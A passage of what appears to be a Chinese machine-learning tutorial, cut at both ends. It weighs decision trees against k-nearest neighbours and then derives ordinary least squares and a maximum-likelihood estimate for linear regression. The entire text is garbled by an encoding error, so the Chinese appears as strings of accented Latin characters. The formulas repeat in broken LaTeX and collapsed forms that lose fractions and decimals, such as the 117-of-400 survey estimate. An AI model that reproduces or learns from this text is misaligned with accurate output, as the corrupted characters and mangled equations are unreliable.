å²ï¼Œå¹¶å¯¹æ‘©æ‰˜è½¦æ„Ÿå…´è¶£ï¼Œé‚£ä¹ˆå°±æ‹’ç»å‘æ”¾è´·æ¬¾ã€ã€‚ å¾ˆå®¹æ˜“å¯è§†åŒ–ï¼Œå³æ¨¡å‹æœ¬èº«ï¼ˆæ ‘ï¼‰å’Œç‰¹å®šæµ‹è¯•å¯¹è±¡çš„é¢„æµ‹ï¼ˆç©¿è¿‡æ ‘çš„è·¯å¾„ï¼‰å¯ä»¥ã€Œè¢«è§£é‡Šã€ã€‚ è®­ç»ƒå’Œé¢„æµ‹çš„é€Ÿåº¦å¿«ã€‚ è¾ƒå°‘çš„å‚æ•°æ•°ç›®ã€‚ æ”¯æŒæ•°å€¼å’Œç±»åˆ«ç‰¹å¾ã€‚ åŠ£åŠ¿ï¼š å†³ç­–æ ‘å¯¹è¾“å…¥æ•°æ®ä¸­çš„å™ªå£°éå¸¸æ•æ„Ÿï¼Œè¿™å‰Šå¼±äº†æ¨¡å‹çš„å¯è§£é‡Šæ€§ã€‚ å†³ç­–æ ‘æ„å»ºçš„è¾¹ç•Œæœ‰å…¶å±€é™æ€§ï¼šå®ƒç”±å‚ç›´äºå…¶ä¸­ä¸€ä¸ªåæ ‡è½´çš„è¶…å¹³é¢ç»„æˆï¼Œåœ¨å®è·µä¸­æ¯”å…¶ä»–æ–¹æ³•çš„æ•ˆæœè¦å·®ã€‚ æˆ‘ä»¬éœ€è¦é€šè¿‡å‰ªæã€è®¾å®šå¶èŠ‚ç‚¹çš„æœ€å°æ ·æœ¬æ•°ã€è®¾å®šæ ‘çš„æœ€å¤§æ·±åº¦ç­‰æ–¹æ³•é¿å…è¿‡æ‹Ÿåˆã€‚ ä¸ç¨³å®šæ€§ï¼Œæ•°æ®çš„ç»†å¾®å˜åŠ¨éƒ½ä¼šæ˜¾è‘—æ”¹å˜å†³ç­–æ ‘ã€‚è¿™ä¸€é—®é¢˜å¯é€šè¿‡å†³ç­–æ ‘é›†æˆæ–¹æ³•æ¥å¤„ç†ï¼ˆä»¥åçš„å®éªŒä¼šä»‹ç»ï¼‰ã€‚ æœç´¢æœ€ä½³å†³ç­–æ ‘æ˜¯ä¸€ä¸ªã€ŒNP å®Œå…¨ã€ï¼ˆNP-Completeï¼‰é—®é¢˜ã€‚äº†è§£ä»€ä¹ˆæ˜¯ NP-Complete è¯·ç‚¹å‡» è¿™é‡Œã€‚å®è·µä¸­ä½¿ç”¨çš„ä¸€äº›æ¨æ–­æ–¹æ³•ï¼Œæ¯”å¦‚åŸºäºæœ€å¤§ä¿¡æ¯å¢ç›Šè¿›è¡Œè´ªå©ªæœç´¢ï¼Œå¹¶ä¸èƒ½ä¿è¯æ‰¾åˆ°å…¨å±€æœ€ä¼˜å†³ç­–æ ‘ã€‚ å€˜è‹¥æ•°æ®ä¸­å‡ºç°ç¼ºå¤±å€¼ï¼Œå°†éš¾ä»¥åˆ›å»ºå†³ç­–æ ‘æ¨¡å‹ã€‚Friedman çš„ CART ç®—æ³•ä¸­å¤§çº¦ 50% çš„ä»£ç æ˜¯ä¸ºäº†å¤„ç†æ•°æ®ä¸­çš„ç¼ºå¤±å€¼ï¼ˆç°åœ¨ sklearn å®ç°äº†è¿™ä¸€ç®—æ³•çš„æ”¹è¿›ç‰ˆæœ¬ï¼‰ã€‚ è¿™ä¸€æ¨¡å‹åªèƒ½å†…æ’ï¼Œä¸èƒ½å¤–æ¨ï¼ˆéšæœºæ£®æ—å’Œæ ‘æå‡æ–¹æ³•ä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå€˜è‹¥ä½ é¢„æµ‹çš„å¯¹è±¡åœ¨è®­ç»ƒé›†æ‰€è®¾ç½®çš„ç‰¹å¾ç©ºé—´ä¹‹å¤–ï¼Œé‚£ä¹ˆå†³ç­–æ ‘å°±åªèƒ½åšå‡ºå¸¸æ•°é¢„æµ‹ã€‚æ¯”å¦‚ï¼Œåœ¨æˆ‘ä»¬çš„é»„çƒå’Œè“çƒçš„ä¾‹å­ä¸­ï¼Œè¿™æ„å‘³ç€æ¨¡å‹å°†å¯¹æ‰€æœ‰ä½äº &gt;19 æˆ– &lt;0 çš„çƒåšå‡ºåŒæ ·çš„é¢„æµ‹ã€‚ æœ€è¿‘é‚»æ–¹æ³• ä¼˜åŠ¿ï¼š å®ç°ç®€å•ã€‚ ç ”ç©¶å¾ˆå……åˆ†ã€‚ é€šå¸¸è€Œè¨€ï¼Œåœ¨åˆ†ç±»ã€å›å½’ã€æ¨èé—®é¢˜ä¸­ç¬¬ä¸€ä¸ªå€¼å¾—å°è¯•çš„æ–¹æ³•å°±æ˜¯æœ€è¿‘é‚»æ–¹æ³•ã€‚ é€šè¿‡é€‰æ‹©æ°å½“çš„è¡¡é‡æ ‡å‡†æˆ–æ ¸ï¼Œå®ƒå¯ä»¥é€‚åº”æŸä¸€ç‰¹å®šé—®é¢˜ã€‚ åŠ£åŠ¿ï¼š å’Œå…¶ä»–å¤åˆç®—æ³•ç›¸æ¯”ï¼Œè¿™ä¸€æ–¹æ³•é€Ÿåº¦è¾ƒå¿«ã€‚ä½†æ˜¯ï¼Œç°å®ç”Ÿæ´»ä¸­ï¼Œç”¨äºåˆ†ç±»çš„é‚»å±…æ•°ç›®é€šå¸¸è¾ƒå¤§ï¼ˆ100-150ï¼‰ï¼Œåœ¨è¿™ä¸€æƒ…å½¢ä¸‹ï¼Œk-NN ä¸å¦‚å†³ç­–æ ‘å¿«ã€‚ å¦‚æœæ•°æ®é›†æœ‰å¾ˆå¤šå˜é‡ï¼Œå¾ˆéš¾æ‰¾åˆ°åˆé€‚çš„æƒé‡ï¼Œä¹Ÿå¾ˆéš¾åˆ¤å®šå“ªäº›ç‰¹å¾å¯¹åˆ†ç±»/å›å½’ä¸é‡è¦ã€‚ ä¾èµ–äºå¯¹è±¡ä¹‹é—´çš„è·ç¦»åº¦é‡ï¼Œé»˜è®¤é€‰é¡¹æ¬§å‡ é‡Œå¾—è·ç¦»å¸¸å¸¸æ˜¯ä¸åˆç†çš„ã€‚ä½ å¯ä»¥é€šè¿‡ç½‘æ ¼æœç´¢å‚æ•°å¾—åˆ°è‰¯å¥½çš„è§£ï¼Œä½†åœ¨å¤§å‹æ•°æ®é›†ä¸Šçš„è€—æ—¶å¾ˆé•¿ã€‚ æ²¡æœ‰ç†è®ºæ¥æŒ‡å¯¼æˆ‘ä»¬å¦‚ä½•é€‰æ‹©é‚»å±…æ•°ï¼Œæ•…è€Œåªèƒ½è¿›è¡Œç½‘æ ¼æœç´¢ï¼ˆå°½ç®¡åŸºæœ¬ä¸Šæ‰€æœ‰çš„æ¨¡å‹ï¼Œåœ¨å¯¹å…¶è¶…å‚æ•°è¿›è¡Œè°ƒæ•´æ—¶éƒ½ä½¿ç”¨ç½‘æ ¼æœç´¢çš„æ–¹æ³•ï¼‰ã€‚åœ¨é‚»å±…æ•°è¾ƒå°çš„æƒ…å½¢ä¸‹ï¼Œè¯¥æ–¹æ³•å¯¹ç¦»æ•£å€¼å¾ˆæ•æ„Ÿï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰è¿‡æ‹Ÿåˆçš„å€¾å‘ã€‚ ç”±äºã€Œç»´åº¦çš„è¯…å’’ã€ï¼Œå½“æ•°æ®é›†å­˜åœ¨å¾ˆå¤šç‰¹å¾æ—¶å®ƒçš„è¡¨ç°ä¸ä½³ã€‚ å®éªŒæ€»ç»“ æœ¬æ¬¡å®éªŒæˆ‘ä»¬é€šè¿‡å†³ç­–æ ‘å’Œæœ€è¿‘é‚»æ–¹æ³•åœ¨å‡ ä¸ªç®€å•ç¤ºä¾‹ä¸Šæ„å»ºäº†åˆ†ç±»æ¨¡å‹ï¼Œå¹¶åŸºäºäº¤å‰éªŒè¯çš„æ–¹æ³•å¯¹æ¨¡å‹è¿›è¡Œè°ƒä¼˜ï¼Œä¹‹åå¯¹æ¯”äº†å†³ç­–æ ‘å’Œæœ€è¿‘é‚»æ–¹æ³•çš„ä¼˜åŠ£æƒ…å†µã€‚è¿™ä¸¤ç§æ–¹æ³•å¸¸å¸¸ä½œä¸ºæœºå™¨å­¦ä¹ æ¨¡å‹çš„åŸºçº¿ï¼Œç†Ÿæ‚‰ä»–ä»¬çš„ç”¨æ³•æ˜¯ååˆ†å¿…è¦çš„ã€‚ ç›¸å…³é“¾æ¥ scikit-learn æ–‡æ¡£ scikit-learn æŒ‡å— æœºå™¨å­¦ä¹ ä¼˜ç§€è¯¾ç¨‹ é€‚åˆå†³ç­–æ ‘å’Œ k-NN çš„æœºå™¨å­¦ä¹ ç®—æ³•å®ç° äº†è§£è“æ¡¥äº‘è¯¾ã€Šæ¥¼+ æœºå™¨å­¦ä¹ å’Œæ•°æ®æŒ–æ˜è¯¾ç¨‹ã€‹ çº¿æ€§å›å½’å’Œçº¿æ€§åˆ†ç±»å™¨ ä»‹ç» æœ¬æ¬¡å®éªŒç®€è¿°äº†æœ€å°äºŒä¹˜æ³•ã€æœ€å¤§ä¼¼ç„¶ä¼°è®¡ã€é€»è¾‘å›å½’ã€æ­£åˆ™åŒ–ã€éªŒè¯å’Œå­¦ä¹ æ›²çº¿çš„åŸºæœ¬æ¦‚å¿µï¼Œæ­å»ºäº†åŸºäºé€»è¾‘å›å½’çš„çº¿æ€§æ¨¡å‹å¹¶è¿›è¡Œæ­£åˆ™åŒ–ï¼Œé€šè¿‡åˆ†æ IBMD æ•°æ®é›†çš„äºŒå…ƒåˆ†ç±»é—®é¢˜å’Œä¸€ä¸ª XOR é—®é¢˜é˜è¿°é€»è¾‘å›å½’çš„ä¼˜ç¼ºç‚¹ã€‚ çŸ¥è¯†ç‚¹ å›å½’ çº¿æ€§åˆ†ç±» é€»è¾‘å›å½’çš„æ­£åˆ™åŒ– é€»è¾‘å›å½’çš„ä¼˜ç¼ºç‚¹ éªŒè¯å’Œå­¦ä¹ æ›²çº¿ æœ€å°äºŒä¹˜æ³• åœ¨å¼€å§‹å­¦ä¹ çº¿æ€§æ¨¡å‹ä¹‹å‰ï¼Œç®€è¦ä»‹ç»ä¸€ä¸‹çº¿æ€§å›å½’ï¼Œé¦–å…ˆæŒ‡å®šä¸€ä¸ªæ¨¡å‹å°†å› å˜é‡ ğ‘¦y å’Œç‰¹å¾è”ç³»èµ·æ¥ï¼Œå¯¹çº¿æ€§æ¨¡å‹è€Œè¨€ï¼Œä¾èµ–å‡½æ•°çš„å½¢å¼å¦‚ä¸‹ï¼š ğ‘¦=ğ‘¤0+âˆ‘ğ‘–=1ğ‘šğ‘¤ğ‘–ğ‘¥ğ‘–y=w0+i=1âˆ‘mwixi å¦‚æœä¸ºæ¯é¡¹è§‚æµ‹åŠ ä¸Šä¸€ä¸ªè™šç»´åº¦ ğ‘¥0=1x0=1ï¼ˆæ¯”å¦‚åç½®ï¼‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠ ğ‘¤0w0 æ•´åˆè¿›æ±‚å’Œé¡¹ä¸­ï¼Œæ”¹å†™ä¸ºä¸€ä¸ªç•¥å¾®ç´§å‡‘çš„å½¢å¼ï¼š ğ‘¦=âˆ‘ğ‘–=0ğ‘šğ‘¤ğ‘–ğ‘¥ğ‘–=wTxy=i=0âˆ‘mwixi=wTx å¦‚æœæœ‰ä¸€ä¸ªç‰¹å¾è§‚æµ‹çŸ©é˜µï¼Œå…¶ä¸­çŸ©é˜µçš„è¡Œæ˜¯æ•°æ®é›†ä¸­çš„è§‚æµ‹ï¼Œé‚£ä¹ˆéœ€è¦åœ¨å·¦è¾¹åŠ ä¸Šä¸€åˆ—ã€‚ç”±æ­¤ï¼Œçº¿æ€§æ¨¡å‹å¯ä»¥å®šä¹‰ä¸ºï¼š y=Xw+Ïµ\\textbf y = \\textbf X \\textbf w + \\epsilon y=Xw+Ïµ å…¶ä¸­ï¼š yâˆˆRn\\textbf y \\in \\mathbb{R}^nyâˆˆRnï¼šå› å˜é‡ï¼ˆç›®æ ‡å˜é‡ï¼‰ã€‚ wwwï¼šæ¨¡å‹çš„å‚æ•°å‘é‡ï¼ˆåœ¨æœºå™¨å­¦ä¹ ä¸­ï¼Œè¿™äº›å‚æ•°ç»å¸¸è¢«ç§°ä¸ºæƒé‡ï¼‰ã€‚ X\\textbf XXï¼šè§‚æµ‹åŠå…¶ç‰¹å¾çŸ©é˜µï¼Œå¤§å°ä¸º n è¡Œã€m+1 åˆ—ï¼ˆåŒ…æ‹¬å·¦ä¾§çš„è™šåˆ—ï¼‰ï¼Œå…¶ç§©çš„å¤§å°ä¸º $\\text{rank}\\left(\\textbf X\\right) = m + 1 $ã€‚ $\\epsilon $ï¼šä¸€ä¸ªå˜é‡ï¼Œç”¨æ¥è¡¨ç¤ºéšæœºã€ä¸å¯é¢„æµ‹æ¨¡å‹çš„é”™è¯¯ã€‚ ä¸Šè¿°è¡¨è¾¾å¼äº¦å¯è¿™æ ·å†™ï¼š yi=âˆ‘j=0mwjXij+Ïµiy_i = \\sum_{j=0}^m w_j X_{ij} + \\epsilon_i yiâ€‹=j=0âˆ‘mâ€‹wjâ€‹Xijâ€‹+Ïµiâ€‹ æ¨¡å‹å…·æœ‰å¦‚ä¸‹é™åˆ¶ï¼ˆå¦åˆ™å®ƒå°±ä¸æ˜¯çº¿æ€§å›å½’äº†ï¼‰ï¼š éšæœºè¯¯å·®çš„æœŸæœ›ä¸ºé›¶ï¼š$\\forall i: \\mathbb{E}\\left[\\epsilon_i\\right] = 0 $; éšæœºè¯¯å·®å…·æœ‰ç›¸åŒçš„æœ‰é™æ–¹å·®ï¼Œè¿™ä¸€æ€§è´¨ç§°ä¸ºç­‰åˆ†æ•£æ€§ï¼š$\\forall i: \\text{Var}\\left(\\epsilon_i\\right) = \\sigma^2 &lt; \\infty $; éšæœºè¯¯å·®ä¸ç›¸å…³ï¼š$\\forall i \\neq j: \\text{Cov}\\left(\\epsilon_i, \\epsilon_j\\right) = 0 $. æƒé‡ wiw_iwiâ€‹ çš„ä¼°è®¡ w^i\\widehat{w}_iwiâ€‹ æ»¡è¶³å¦‚ä¸‹æ¡ä»¶æ—¶ï¼Œç§°å…¶ä¸ºçº¿æ€§ï¼š w^i=Ï‰1iy1+Ï‰2iy2+â‹¯+Ï‰niyn\\widehat{w}_i = \\omega_{1i}y_1 + \\omega_{2i}y_2 + \\cdots + \\omega_{ni}y_n wiâ€‹=Ï‰1iâ€‹y1â€‹+Ï‰2iâ€‹y2â€‹+â‹¯+Ï‰niâ€‹ynâ€‹ å…¶ä¸­å¯¹äº $\\forall\\ k\\ ï¼Œï¼Œï¼Œ\\omega_{ki}$ ä»…ä¾èµ–äº XXX ä¸­çš„æ ·æœ¬ã€‚ç”±äºå¯»æ±‚æœ€ä½³æƒé‡çš„è§£æ˜¯ä¸€ä¸ªçº¿æ€§ä¼°è®¡ï¼Œè¿™ä¸€æ¨¡å‹è¢«ç§°ä¸ºçº¿æ€§å›å½’ã€‚ å†å¼•å…¥ä¸€é¡¹å®šä¹‰ï¼šå½“æœŸæœ›å€¼ç­‰äºä¼°è®¡å‚æ•°çš„çœŸå®å€¼æ—¶ï¼Œæƒé‡ä¼°è®¡è¢«ç§°ä¸ºæ— åï¼ˆunbiasedï¼‰ï¼š E[w^i]=wi\\mathbb{E}\\left[\\widehat{w}_i\\right] = w_i E[wiâ€‹]=wiâ€‹ è®¡ç®—è¿™äº›æƒé‡çš„æ–¹æ³•ä¹‹ä¸€æ˜¯æ™®é€šæœ€å°äºŒä¹˜æ³•ï¼ˆOLSï¼‰ã€‚OLS å¯ä»¥æœ€å°åŒ–å› å˜é‡å®é™…å€¼å’Œæ¨¡å‹ç»™å‡ºçš„é¢„æµ‹å€¼ä¹‹é—´çš„å‡æ–¹è¯¯å·®ï¼š L(X,y,w)=12nâˆ‘i=1n(yiâˆ’wTxi)2 =12nâˆ£yâˆ’Xwâˆ£22 =12n(yâˆ’Xw)T(yâˆ’Xw)\\begin{array}{rcl}\\mathcal{L}\\left(\\textbf X, \\textbf{y}, \\textbf{w} \\right) &amp;=&amp; \\frac{1}{2n} \\sum_{i=1}^n \\left(y_i - \\textbf{w}^\\text{T} \\textbf{x}_i\\right)^2 \\ &amp;=&amp; \\frac{1}{2n} \\left| \\textbf{y} - \\textbf X \\textbf{w} \\right|_2^2 \\ &amp;=&amp; \\frac{1}{2n} \\left(\\textbf{y} - \\textbf X \\textbf{w}\\right)^\\text{T} \\left(\\textbf{y} - \\textbf X \\textbf{w}\\right) \\end{array} L(X,y,w)â€‹=â€‹2n1â€‹âˆ‘i=1nâ€‹(yiâ€‹âˆ’wTxiâ€‹)2 â€‹=â€‹2n1â€‹âˆ£yâˆ’Xwâˆ£22â€‹ â€‹=â€‹2n1â€‹(yâˆ’Xw)T(yâˆ’Xw)â€‹ ä¸ºäº†è§£å†³è¿™ä¸€ä¼˜åŒ–é—®é¢˜ï¼Œéœ€è¦è®¡ç®—æ¨¡å‹å‚æ•°çš„å¯¼æ•°ã€‚å°†å¯¼æ•°è®¾ä¸ºé›¶ï¼Œç„¶åæ±‚è§£å…³äº ww çš„ç­‰å¼ï¼Œå€˜è‹¥ä¸ç†Ÿæ‚‰çŸ©é˜µæ±‚å¯¼ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„ 4 ä¸ªå¼å­ï¼š âˆ‚âˆ‚XXTA=A\\begin{array}{rcl} \\frac{\\partial}{\\partial \\textbf{X}} \\textbf{X}^{\\text{T}} \\textbf{A} &amp;=&amp; \\textbf{A} \\end{array}âˆ‚Xâˆ‚â€‹XTAâ€‹=â€‹Aâ€‹ âˆ‚âˆ‚XXTAX=(A+AT)X\\begin{array}{rcl} \\frac{\\partial}{\\partial \\textbf{X}} \\textbf{X}^{\\text{T}} \\textbf{A} \\textbf{X} &amp;=&amp; \\left(\\textbf{A} + \\textbf{A}^{\\text{T}}\\right)\\textbf{X} \\end{array} âˆ‚Xâˆ‚â€‹XTAXâ€‹=â€‹(A+AT)Xâ€‹ âˆ‚âˆ‚AXTAy=XTy\\begin{array}{rcl}\\frac{\\partial}{\\partial \\textbf{A}} \\textbf{X}^{\\text{T}} \\textbf{A} \\textbf{y} &amp;=&amp; \\textbf{X}^{\\text{T}} \\textbf{y} \\end{array} âˆ‚Aâˆ‚â€‹XTAyâ€‹=â€‹XTyâ€‹ âˆ‚âˆ‚XAâˆ’1=âˆ’Aâˆ’1âˆ‚Aâˆ‚XAâˆ’1\\begin{array}{rcl} \\frac{\\partial}{\\partial \\textbf{X}} \\textbf{A}^{-1} &amp;=&amp; -\\textbf{A}^{-1} \\frac{\\partial \\textbf{A}}{\\partial \\textbf{X}} \\textbf{A}^{-1} \\end{array}âˆ‚Xâˆ‚â€‹Aâˆ’1â€‹=â€‹âˆ’Aâˆ’1âˆ‚Xâˆ‚Aâ€‹Aâˆ’1â€‹ ç°åœ¨å¼€å§‹è®¡ç®—æ¨¡å‹å‚æ•°çš„å¯¼æ•°ï¼š âˆ‚Lâˆ‚w=âˆ‚âˆ‚w12n(yTyâˆ’2yTXw+wTXTXw) =12n(âˆ’2XTy+2XTXw)\\begin{array}{rcl} \\frac{\\partial \\mathcal{L}}{\\partial \\textbf{w}} &amp;=&amp; \\frac{\\partial}{\\partial \\textbf{w}} \\frac{1}{2n} \\left( \\textbf{y}^{\\text{T}} \\textbf{y} -2\\textbf{y}^{\\text{T}} \\textbf{X} \\textbf{w} + \\textbf{w}^{\\text{T}} \\textbf{X}^{\\text{T}} \\textbf{X} \\textbf{w}\\right) \\ &amp;=&amp; \\frac{1}{2n} \\left(-2 \\textbf{X}^{\\text{T}} \\textbf{y} + 2\\textbf{X}^{\\text{T}} \\textbf{X} \\textbf{w}\\right) \\end{array} âˆ‚wâˆ‚Lâ€‹â€‹=â€‹âˆ‚wâˆ‚â€‹2n1â€‹(yTyâˆ’2yTXw+wTXTXw) â€‹=â€‹2n1â€‹(âˆ’2XTy+2XTXw)â€‹ âˆ‚Lâˆ‚w=0â‡”12n(âˆ’2XTy+2XTXw)=0 â‡”âˆ’XTy+XTXw=0 â‡”XTXw=XTy â‡”w=(XTX)âˆ’1XTy\\begin{array}{rcl} \\frac{\\partial \\mathcal{L}}{\\partial \\textbf{w}} = 0 &amp;\\Leftrightarrow&amp; \\frac{1}{2n} \\left(-2 \\textbf{X}^{\\text{T}} \\textbf{y} + 2\\textbf{X}^{\\text{T}} \\textbf{X} \\textbf{w}\\right) = 0 \\ &amp;\\Leftrightarrow&amp; -\\textbf{X}^{\\text{T}} \\textbf{y} + \\textbf{X}^{\\text{T}} \\textbf{X} \\textbf{w} = 0 \\ &amp;\\Leftrightarrow&amp; \\textbf{X}^{\\text{T}} \\textbf{X} \\textbf{w} = \\textbf{X}^{\\text{T}} \\textbf{y} \\ &amp;\\Leftrightarrow&amp; \\textbf{w} = \\left(\\textbf{X}^{\\text{T}} \\textbf{X}\\right)^{-1} \\textbf{X}^{\\text{T}} \\textbf{y} \\end{array} âˆ‚wâˆ‚Lâ€‹=0â€‹â‡”â€‹2n1â€‹(âˆ’2XTy+2XTXw)=0 â€‹â‡”â€‹âˆ’XTy+XTXw=0 â€‹â‡”â€‹XTXw=XTy â€‹â‡”â€‹w=(XTX)âˆ’1XTyâ€‹ åŸºäºä¸Šè¿°çš„å®šä¹‰å’Œæ¡ä»¶ï¼Œå¯ä»¥è¯´ï¼Œæ ¹æ®é«˜æ–¯-é©¬å°”å¯å¤«å®šç†ï¼Œæ¨¡å‹å‚æ•°çš„ OLS ä¼°è®¡æ˜¯æ‰€æœ‰çº¿æ€§æ— åä¼°è®¡ä¸­æœ€ä¼˜çš„ï¼Œå³é€šè¿‡ OLS ä¼°è®¡å¯ä»¥è·å¾—æœ€ä½çš„æ–¹å·®ã€‚ æœ‰äººå¯èƒ½ä¼šé—®ï¼Œä¸ºä½•é€‰æ‹©æœ€å°åŒ–å‡æ–¹è¯¯å·®è€Œä¸æ˜¯å…¶ä»–æŒ‡æ ‡ï¼Ÿå› ä¸ºè‹¥ä¸é€‰æ‹©æœ€å°åŒ–å‡æ–¹è¯¯å·®ï¼Œé‚£ä¹ˆå°±ä¸æ»¡è¶³é«˜æ–¯-é©¬å°”å¯å¤«å®šç†çš„æ¡ä»¶ï¼Œå¾—åˆ°çš„ä¼°è®¡å°†ä¸å†æ˜¯æœ€ä½³çš„çº¿æ€§æ— åä¼°è®¡ã€‚ æœ€å¤§ä¼¼ç„¶ä¼°è®¡æ˜¯è§£å†³çº¿æ€§å›å½’é—®é¢˜ä¸€ç§å¸¸ç”¨æ–¹æ³•ï¼Œä¸‹é¢ä»‹ç»å®ƒçš„æ¦‚å¿µã€‚ æœ€å¤§ä¼¼ç„¶ä¼°è®¡ é¦–å…ˆä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬æƒ³åšä¸€ä¸ªè¯•éªŒåˆ¤å®šäººä»¬æ˜¯å¦è®°å¾—ç®€å•çš„ç”²é†‡åŒ–å­¦å¼ ğ¶ğ»3ğ‘‚ğ»C**H3O**Hã€‚é¦–å…ˆè°ƒæŸ¥äº† 400 äººï¼Œå‘ç°åªæœ‰ 117 ä¸ªäººè®°å¾—ç”²é†‡çš„åŒ–å­¦å¼ã€‚é‚£ä¹ˆï¼Œç›´æ¥å°† 117400â‰ˆ29400117â‰ˆ29 ä½œä¸ºä¼°è®¡ä¸‹ä¸€ä¸ªå—è®¿è€…çŸ¥é“ç”²é†‡åŒ–å­¦å¼çš„æ¦‚ç‡æ˜¯è¾ƒä¸ºåˆç†çš„ã€‚è¿™ä¸ªç›´è§‚çš„ä¼°è®¡å°±æ˜¯ä¸€ä¸ªæœ€å¤§ä¼¼ç„¶ä¼°è®¡ã€‚ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆä¼°è®¡å‘¢ï¼Ÿå›å¿†ä¸‹ä¼¯åŠªåˆ©åˆ†å¸ƒçš„å®šä¹‰ï¼šå¦‚æœä¸€ä¸ªéšæœºå˜é‡åªæœ‰ä¸¤ä¸ªå€¼ï¼ˆ1 å’Œ 0ï¼Œç›¸åº”çš„æ¦‚ç‡ä¸º ğœƒÎ¸ å’Œ 1âˆ’ğœƒ1âˆ’Î¸ï¼‰ï¼Œé‚£ä¹ˆè¯¥éšæœºå˜é‡æ»¡è¶³ä¼¯åŠªåˆ©åˆ†å¸ƒï¼Œéµå¾ªä»¥ä¸‹æ¦‚ç‡åˆ†å¸ƒå‡½æ•°ï¼š p\\left(\\theta, x\\right) = \\theta^x \\left(1 - \\theta\\right)^\\left(1 - x\\right), x \\in \\left\\{0, 1\\right\\} è¿™ä¸€åˆ†å¸ƒæ­£æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ï¼Œåˆ†å¸ƒå‚æ•° ğœƒÎ¸ å°±æ˜¯ã€ŒæŸä¸ªäººçŸ¥é“ç”²é†‡åŒ–å­¦å¼ã€çš„æ¦‚ç‡ä¼°è®¡ã€‚åœ¨ 400 ä¸ªç‹¬ç«‹è¯•éªŒä¸­ï¼Œè¯•éªŒçš„ç»“æœè®°ä¸º x=(x1,x2,â€¦,x400)\\textbf{x} = \\left(x_1, x_2, \\ldots, x_{400}\\right)x=(x1â€‹,x2â€‹,â€¦,x400â€‹)ã€‚å†™ä¸‹æ•°æ®çš„ä¼¼ç„¶ï¼Œå³è§‚æµ‹çš„å¯èƒ½æ€§ï¼Œæ¯”å¦‚æ­£å¥½è§‚æµ‹åˆ° 117 ä¸ªéšæœºå˜é‡ ğ‘¥=1x=1 å’Œ 283 ä¸ªéšæœºå˜é‡ ğ‘¥=0x=0 çš„å¯èƒ½æ€§ï¼š p(x;Î¸)=âˆi=1400Î¸xi(1âˆ’Î¸)(1âˆ’xi)=Î¸117(1âˆ’Î¸)283p(\\textbf{x}; \\theta) = \\prod_{i=1}^{400} \\theta^{x_i} \\left(1 - \\theta\\right)^{\\left(1 - x_i\\right)} = \\theta^{117} \\left(1 - \\theta\\right)^{283} p(x;Î¸)=i=1âˆ400â€‹Î¸xiâ€‹(1âˆ’Î¸)(1âˆ’xiâ€‹)=Î¸117(1âˆ’Î¸)283 æ¥ç€ï¼Œå°†æœ€å¤§åŒ–è¿™ä¸€ Î¸\\thetaÎ¸ çš„è¡¨è¾¾å¼ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä¸ºäº†ç®€åŒ–è®¡ç®—ï¼Œå¹¶ä¸æœ€å¤§åŒ–ä¼¼ç„¶ p(x;Î¸)p(\\textbf{x}; \\theta)p(x;Î¸)ï¼Œè½¬è€Œæœ€å¤§åŒ–å…¶å¯¹æ•°ï¼ˆè¿™ç§å˜æ¢ä¸å½±å“æœ€ç»ˆç­”æ¡ˆï¼‰ï¼š logâ¡p(x;Î¸)=logâ¡âˆi=1400Î¸xi(1âˆ’Î¸)(1âˆ’xi)=\\log p(\\textbf{x}; \\theta) = \\log \\prod_{i=1}^{400} \\theta^{x_i} \\left(1 - \\theta\\right)^{\\left(1 - x_i\\right)} = logp(x;Î¸)=logi=1âˆ400â€‹Î¸xiâ€‹(1âˆ’Î¸)(1âˆ’xiâ€‹)= =logâ¡Î¸117(1âˆ’Î¸)283=117logâ¡Î¸+283logâ¡(1âˆ’Î¸)= \\log \\theta^{117} \\left(1 - \\theta\\right)^{283} = 117 \\log \\theta + 283 \\log \\left(1 - \\theta\\right) =logÎ¸117(1âˆ’Î¸)283=117logÎ¸+283log(1âˆ’Î¸) ä¸ºäº†æ‰¾åˆ°æœ€å¤§åŒ–ä¸Šå¼çš„ ğœƒÎ¸ å€¼ï¼Œå°†ä¸Šå¼å¯¹ ğœƒÎ¸ æ±‚å¯¼ï¼Œå¹¶ä»¤å…¶ä¸ºé›¶ï¼Œæ±‚è§£æ‰€å¾—ç­‰å¼ï¼š âˆ‚logâ¡p(x;Î¸)âˆ‚Î¸=âˆ‚âˆ‚Î¸(117logâ¡Î¸+283logâ¡(1âˆ’Î¸))=117Î¸âˆ’2831âˆ’Î¸;\\frac{\\partial \\log p(\\textbf{x}; \\theta)}{\\partial \\theta} = \\frac{\\partial}{\\partial \\theta} \\left(117 \\log \\theta + 283 \\log \\left(1 - \\theta\\right)\\right) = \\frac{117}{\\theta} - \\frac{283}{1 - \\theta}; âˆ‚Î¸âˆ‚logp(x;Î¸)â€‹=âˆ‚Î¸âˆ‚â€‹(117logÎ¸+283log(1âˆ’Î¸))=Î¸117â€‹âˆ’1âˆ’Î¸283â€‹; ç”±ä¸Šå¯çŸ¥ï¼Œæˆ‘ä»¬çš„ç›´è§‚ä¼°è®¡æ­£å¥½æ˜¯æœ€å¤§ä¼¼ç„¶ä¼°è®¡ã€‚ç°åœ¨å°†è¿™ä¸€æ¨ç†è¿‡ç¨‹åº”ç”¨åˆ°çº¿æ€§å›å½’é—®é¢˜ä¸Šï¼Œå°è¯•æ‰¾å‡ºå‡æ–¹è¯¯å·®èƒŒåçš„é“ç†ã€‚ä¸ºæ­¤ï¼Œéœ€è¦ä»æ¦‚ç‡è®ºçš„è§’åº¦æ¥çœ‹çº¿æ€§å›å½’ã€‚æˆ‘ä»¬çš„æ¨¡å‹å’Œä¹‹å‰æ˜¯ä¸€æ ·çš„ï¼š y=Xw+Ïµ\\textbf y = \\textbf X \\textbf w + \\epsilon y=Xw+Ïµ ä¸è¿‡ï¼Œç°åœ¨å‡å®šéšæœºè¯¯å·®ç¬¦åˆå‡å€¼ä¸ºé›¶çš„ æ­£æ€åˆ†å¸ƒï¼š Ïµiâˆ¼N(0,Ïƒ2)\\epsilon_i \\sim \\mathcal{N}\\left(0, \\sigma^2\\right) Ïµiâ€‹âˆ¼N(0,Ïƒ2) 